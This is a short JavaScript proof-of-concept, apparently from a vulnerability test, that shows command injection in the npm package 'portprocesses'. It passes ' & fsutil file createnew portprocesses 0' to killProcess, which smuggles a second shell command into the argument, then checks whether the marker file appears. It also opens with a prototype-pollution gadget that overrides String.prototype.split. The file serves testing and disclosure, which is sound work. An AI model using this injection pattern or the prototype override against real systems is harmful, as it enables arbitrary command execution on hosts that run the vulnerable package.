var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const portprocesses = require('portprocesses');
const fs = require('fs');
const path = './portprocesses';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
console.log(portprocesses.killProcess(' & fsutil file createnew portprocesses 0').finally(() => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, () => {
    });
}));